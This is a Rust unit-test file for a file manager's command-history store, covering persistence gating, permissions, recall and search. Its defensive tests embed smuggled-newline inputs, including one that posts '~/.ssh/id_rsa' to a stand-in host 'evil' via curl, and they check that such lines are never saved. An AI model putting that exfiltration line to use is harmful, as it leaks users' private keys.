//! Unit tests: command history store, durability gate, suggestions.
#![allow(unused_imports)]

use super::*;
use std::fs;
use tempfile::TempDir;

/// RAII restore of `XDG_DATA_HOME`, mirroring `test_support::EditorEnvGuard`:
/// holds the crate-wide env lock and restores the previous value on `Drop`, so a
/// panicking test cannot leak the sandboxed path to a concurrent test even
/// though the process-global env var is shared.
struct XdgGuard {
    _lock: std::sync::MutexGuard<'static, ()>,
    previous: Option<std::ffi::OsString>,
}

impl XdgGuard {
    fn set(path: &std::path::Path) -> Self {
        let lock = crate::test_support::env_lock();
        let previous = std::env::var_os("XDG_DATA_HOME");
        std::env::set_var("XDG_DATA_HOME", path);
        Self {
            _lock: lock,
            previous,
        }
    }
}

impl Drop for XdgGuard {
    fn drop(&mut self) {
        match self.previous.take() {
            Some(v) => std::env::set_var("XDG_DATA_HOME", v),
            None => std::env::remove_var("XDG_DATA_HOME"),
        }
    }
}

/// Redirect `XDG_DATA_HOME` to a tempdir for the duration of a test.
/// History file I/O reads the variable at call time, so tests must
/// serialize access — the guard reuses the global env lock from `test_support`
/// and restores the variable on unwind.
fn with_xdg<T>(f: impl FnOnce(&std::path::Path) -> T) -> T {
    let tmp = TempDir::new().expect("tempdir");
    let _guard = XdgGuard::set(tmp.path());
    f(tmp.path())
}

#[test]
fn durable_line_accepts_known_verbs_only() {
    assert!(DurableLine::classify("cd /tmp").is_some());
    assert!(DurableLine::classify("sort size").is_some());
    assert!(DurableLine::classify("bookmark go 3").is_some());
    // One assertion per remaining known-verb family, so the allow-list's
    // coverage in `DurableLine::classify` is visible here rather than only
    // enforced by the compiler at the match site.
    assert!(DurableLine::classify("pwd").is_some());
    assert!(DurableLine::classify("mark all").is_some());
    assert!(DurableLine::classify("unmark").is_some());
    assert!(DurableLine::classify("help").is_some());
    assert!(DurableLine::classify("winmsg").is_some());
    assert!(DurableLine::classify("winperf").is_some());
    assert!(DurableLine::classify("mcp").is_some());
    assert!(DurableLine::classify("quit").is_some());
    // Shell fall-through and known-verb-bad-args must never be durable.
    assert!(DurableLine::classify("aws s3 cp x --token SECRET").is_none());
    assert!(DurableLine::classify("bookmark set 99").is_none());
    assert!(DurableLine::classify("").is_none());
}

#[test]
fn classify_rejects_embedded_newlines() {
    // Invariant: one `DurableLine` is exactly one physical file line. A verb
    // followed by an interior newline would classify on the whole string but
    // `save()`/`load()` split per physical line, so the second physical line
    // (attacker-influenceable via a completed filename) could round-trip back
    // as a `Shell` command. The gate rejects any embedded newline outright.
    assert!(DurableLine::classify("cd foo\ncurl evil").is_none());
    assert!(DurableLine::classify("cd foo\r\ncurl evil").is_none());
    assert!(DurableLine::classify("cd foo\rcurl evil").is_none());
    // A plain durable line without embedded newlines is still accepted.
    assert!(DurableLine::classify("cd foo").is_some());
}

#[test]
fn record_of_embedded_newline_writes_nothing_to_disk() {
    with_xdg(|xdg| {
        let mut h = History::load();
        // A `cd` the user "accepted" whose completed leaf smuggled a newline.
        h.record("cd docs\ncurl -d @~/.ssh/id_rsa evil");

        // Security property: not one byte of it reaches disk — no second
        // physical line that would reload as a Shell command.
        let file = xdg.join("ffm/history");
        assert!(
            !file.exists(),
            "embedded-newline line must never be persisted: {:?}",
            fs::read_to_string(&file)
        );
        // And a fresh load sees nothing of it.
        assert_eq!(History::load().suggest("cd docs"), None);
    });
}

#[test]
fn record_persists_durable_lines_across_loads() {
    with_xdg(|_| {
        let mut h = History::load();
        h.record("cd /tmp");
        h.record("sort size");

        let reloaded = History::load();
        assert_eq!(reloaded.suggest("cd"), Some("cd /tmp"));
        assert_eq!(reloaded.suggest("so"), Some("sort size"));
    });
}

#[test]
fn shell_lines_stay_in_session_and_off_disk() {
    with_xdg(|xdg| {
        let mut h = History::load();
        h.record("aws s3 cp x s3://b --token SECRET");

        // Usable this session…
        assert_eq!(h.suggest("aws"), Some("aws s3 cp x s3://b --token SECRET"));
        // …but nothing of it on disk, and not seen by a fresh load.
        let file = xdg.join("ffm/history");
        let on_disk = fs::read_to_string(&file).unwrap_or_default();
        assert!(!on_disk.contains("SECRET"), "disk: {on_disk}");
        assert_eq!(History::load().suggest("aws"), None);
    });
}

#[test]
fn suggest_is_literal_prefix_and_newest_wins() {
    with_xdg(|_| {
        let mut h = History::load();
        h.record("cd /old");
        h.record("cd /new");

        assert_eq!(h.suggest("cd /"), Some("cd /new"));
        // Literal prefix only — no fuzzy: "c/" is not a prefix of anything.
        assert_eq!(h.suggest("c/"), None);
        // A prefix equal to a full entry has no tail to offer.
        assert_eq!(h.suggest("cd /new"), None);
    });
}

#[test]
fn duplicate_records_keep_only_the_newest() {
    with_xdg(|xdg| {
        let mut h = History::load();
        h.record("cd /tmp");
        h.record("pwd");
        h.record("cd /tmp");

        let on_disk = fs::read_to_string(xdg.join("ffm/history")).expect("file");
        assert_eq!(
            on_disk.matches("cd /tmp").count(),
            1,
            "dedup keeps one copy: {on_disk}"
        );
        // …and it is the newest, so it wins over "pwd" for a "" prefix? No:
        // empty prefix has no tail rule — assert via the concrete prefix.
        assert_eq!(h.suggest("cd"), Some("cd /tmp"));
    });
}

#[test]
fn the_file_is_capped() {
    with_xdg(|xdg| {
        let mut h = History::load();
        for i in 0..(HISTORY_CAP + 50) {
            h.record(&format!("cd /dir{i}"));
        }
        let on_disk = fs::read_to_string(xdg.join("ffm/history")).expect("file");
        assert_eq!(on_disk.lines().count(), HISTORY_CAP);
        // Oldest lines fell off, newest survived.
        assert!(!on_disk.contains("/dir0\n"), "oldest should be gone");
        assert!(
            on_disk.contains(&format!("cd /dir{}\n", HISTORY_CAP + 49)),
            "newest line survives"
        );
    });
}

#[test]
fn corrupt_or_missing_file_is_an_empty_history() {
    with_xdg(|xdg| {
        // Missing file.
        assert_eq!(History::load().suggest("cd"), None);
        // Corrupt file (invalid UTF-8) must not panic and must not leak junk.
        fs::create_dir_all(xdg.join("ffm")).expect("mkdir");
        fs::write(xdg.join("ffm/history"), [0xFF, 0xFE, 0x00]).expect("write");
        let h = History::load();
        assert_eq!(h.suggest("cd"), None);
    });
}

#[test]
fn default_history_never_persists() {
    // `History::default()` must be a session-only history that can never touch
    // disk, no matter what it records — this is what makes `App::new()` (which
    // starts every App with `History::default()`, see `models.rs`) safe to call
    // from every test that drives the CommandLine Enter path, without polluting
    // the real user's `~/.local/share/ffm/history`. `History::load()` (used only
    // by production `main_impl` in `lib.rs`, and by this module's own tests,
    // always under `with_xdg`) is the only path that resolves and stores a real
    // `path`.
    with_xdg(|xdg| {
        let mut h = History::default();
        h.record("cd /tmp");

        assert_eq!(h.suggest("cd"), Some("cd /tmp"), "session ring still works");
        assert!(
            !xdg.join("ffm/history").exists(),
            "default() must never write to disk, even under a live XDG sandbox"
        );
    });
}

#[cfg(unix)]
#[test]
fn the_history_file_is_owner_only() {
    use std::os::unix::fs::PermissionsExt;
    with_xdg(|xdg| {
        let mut h = History::load();
        h.record("cd /tmp");
        let mode = fs::metadata(xdg.join("ffm/history"))
            .expect("file")
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600, "history holds the user's paths");
    });
}

#[cfg(unix)]
#[test]
fn a_pre_existing_loose_history_file_is_tightened() {
    use std::os::unix::fs::PermissionsExt;
    with_xdg(|xdg| {
        // A history file that predates the owner-only write, left group/world
        // readable (0644). Writing to it must correct the mode, not preserve it.
        let file = xdg.join("ffm/history");
        fs::create_dir_all(file.parent().expect("parent")).expect("mkdir");
        fs::write(&file, "cd /old\n").expect("seed");
        fs::set_permissions(&file, fs::Permissions::from_mode(0o644)).expect("chmod");

        let mut h = History::load();
        h.record("cd /new");

        let mode = fs::metadata(&file).expect("file").permissions().mode();
        assert_eq!(
            mode & 0o777,
            0o600,
            "loose pre-existing file must be tightened"
        );
    });
}

#[test]
fn relative_xdg_data_home_is_ignored() {
    // A relative $XDG_DATA_HOME is invalid per the XDG spec; honoring it would
    // send history to a cwd-relative path. It must be ignored, falling back to
    // $HOME/.local/share. Reuse the same env lock via the guard.
    let _guard = XdgGuard::set(std::path::Path::new("relative/data"));
    let home = std::env::var_os("HOME")
        .map(std::path::PathBuf::from)
        .expect("HOME set in test environment");
    assert_eq!(
        history_file_path(),
        Some(home.join(".local/share/ffm/history"))
    );
}

/// Whitespace-only input is not a command: nothing enters the session ring and
/// nothing is written to disk.
#[test]
fn record_of_empty_or_whitespace_is_a_noop() {
    with_xdg(|xdg| {
        let mut h = History::load();
        h.record("");
        h.record("   ");
        h.record("\t\n");

        assert_eq!(h.suggest("c"), None, "session ring stays empty");
        assert!(
            !xdg.join("ffm/history").exists(),
            "whitespace must not create a history file"
        );
    });
}

/// A save whose parent directory cannot be created is swallowed: the file
/// manager must not fail because history is unwritable.
#[cfg(unix)]
#[test]
fn save_swallows_failure_when_the_parent_path_is_not_a_directory() {
    with_xdg(|xdg| {
        // `~/.local/share/ffm` is a file, so create_dir_all on it fails and the
        // history path under it cannot be written.
        let blocker = xdg.join("ffm");
        fs::write(&blocker, b"not a directory").expect("block parent");

        let mut h = History::load();
        h.record("cd /tmp"); // triggers save; must not panic

        assert!(
            fs::metadata(&blocker).expect("blocker").is_file(),
            "save must not replace the blocking file with a directory"
        );
        assert!(
            !xdg.join("ffm/history").exists(),
            "no history file appears when its parent cannot be created"
        );
    });
}

#[test]
fn save_gives_up_quietly_when_the_parent_cannot_be_created() {
    let temp = TempDir::new().expect("temp dir");
    let file = temp.path().join("not-a-dir");
    fs::write(&file, "occupied").expect("write");

    // The parent chain runs through a plain file, so create_dir_all must fail
    // and save must swallow it: losing history may never break the manager.
    let history = History {
        persistence: Persistence::File(file.join("sub").join("history.txt")),
        ..Default::default()
    };
    history.save();

    assert!(!file.join("sub").exists());
    assert_eq!(fs::read_to_string(&file).expect("read"), "occupied");
}

#[cfg(unix)]
#[test]
fn save_handles_a_parentless_path_without_creating_anything() {
    // `/` has no parent: the mkdir step is skipped entirely and the write
    // itself fails against a directory — both swallowed, like every other
    // history failure.
    let history = History {
        persistence: Persistence::File(std::path::PathBuf::from("/")),
        ..Default::default()
    };
    history.save();
}

// ─── recall and reverse search ────────────────────────────────────────────

#[test]
fn recall_walks_back_from_the_newest_and_stops_at_the_oldest() {
    let mut history = History::default();
    history.record("cd /one");
    history.record("cd /two");
    history.record("cd /three");

    assert_eq!(history.recall(RingIndex::new(0)), Some("cd /three"));
    assert_eq!(history.recall(RingIndex::new(1)), Some("cd /two"));
    assert_eq!(history.recall(RingIndex::new(2)), Some("cd /one"));
    // Past the oldest: `None` is what stops `Up` instead of wrapping around.
    assert_eq!(history.recall(RingIndex::new(3)), None);
}

#[test]
fn recall_of_an_empty_history_yields_nothing() {
    assert_eq!(History::default().recall(RingIndex::new(0)), None);
}

#[test]
fn recall_does_not_show_a_line_twice_from_both_rings() {
    // A durable line executed this run lives in the session ring *and* on
    // disk; walking through it twice would read as a stuck Up key.
    with_xdg(|_| {
        let mut history = History::load();
        history.record("cd /persisted");
        history.record("secret-token-command");

        let reloaded = {
            let mut fresh = History::load();
            fresh.record("cd /persisted");
            fresh
        };
        assert_eq!(reloaded.recall(RingIndex::new(0)), Some("cd /persisted"));
        assert_eq!(
            reloaded.recall(RingIndex::new(1)),
            None,
            "the durable copy of the same line must not repeat"
        );
    });
}

#[test]
fn recall_reaches_persisted_lines_after_the_session_ones() {
    with_xdg(|_| {
        {
            let mut first = History::load();
            first.record("cd /from-disk");
        }
        let mut second = History::load();
        second.record("cd /this-session");

        assert_eq!(second.recall(RingIndex::new(0)), Some("cd /this-session"));
        assert_eq!(second.recall(RingIndex::new(1)), Some("cd /from-disk"));
    });
}

#[test]
fn search_back_finds_a_substring_not_just_a_prefix() {
    let mut history = History::default();
    history.record("grep needle /var/log/syslog");
    history.record("cd /tmp");

    // Unlike `suggest`, which is prefix-only because Right accepts it blind.
    assert_eq!(
        history.search_back("needle", RingIndex::new(0)),
        Some(RingIndex::new(1))
    );
    assert_eq!(history.suggest("needle"), None);
}

#[test]
fn search_back_resumes_past_the_index_it_is_given() {
    let mut history = History::default();
    history.record("cd /alpha");
    history.record("cd /beta");
    history.record("ls");

    assert_eq!(
        history.search_back("cd", RingIndex::new(0)),
        Some(RingIndex::new(1))
    );
    // A second Ctrl+R steps to the next older match.
    assert_eq!(
        history.search_back("cd", RingIndex::new(2)),
        Some(RingIndex::new(2))
    );
    assert_eq!(history.search_back("cd", RingIndex::new(3)), None);
}

#[test]
fn search_back_with_an_empty_query_matches_nothing() {
    let mut history = History::default();
    history.record("cd /tmp");
    // Otherwise a bare Ctrl+R would silently recall the last command.
    assert_eq!(history.search_back("", RingIndex::new(0)), None);
}

#[test]
fn ring_index_steps_in_both_directions_and_stops_at_the_newest() {
    // The walk lives on the type, so Up and Down cannot drift apart in how
    // they move — and `newer()` returning None at the newest entry is what
    // tells the prompt to put the half-typed line back.
    let newest = RingIndex::NEWEST;
    assert_eq!(newest.offset(), 0);
    assert_eq!(newest.newer(), None);
    assert_eq!(newest.older().offset(), 1);
    assert_eq!(newest.older().older().newer(), Some(RingIndex::new(1)));
}

#[test]
fn session_only_is_a_named_state_not_a_missing_path() {
    // `Option<PathBuf>` read as "the path might be missing"; it meant "this
    // history deliberately does not persist", which is what every test and
    // every freshly-constructed App is in.
    assert_eq!(Persistence::default(), Persistence::SessionOnly);
    assert_eq!(Persistence::SessionOnly.file(), None);
    assert_eq!(
        Persistence::File(std::path::PathBuf::from("/tmp/h")).file(),
        Some(std::path::Path::new("/tmp/h"))
    );

    // A default history records for the session and writes nothing.
    let mut history = History::default();
    history.record("cd /tmp");
    assert_eq!(history.recall(RingIndex::NEWEST), Some("cd /tmp"));
}
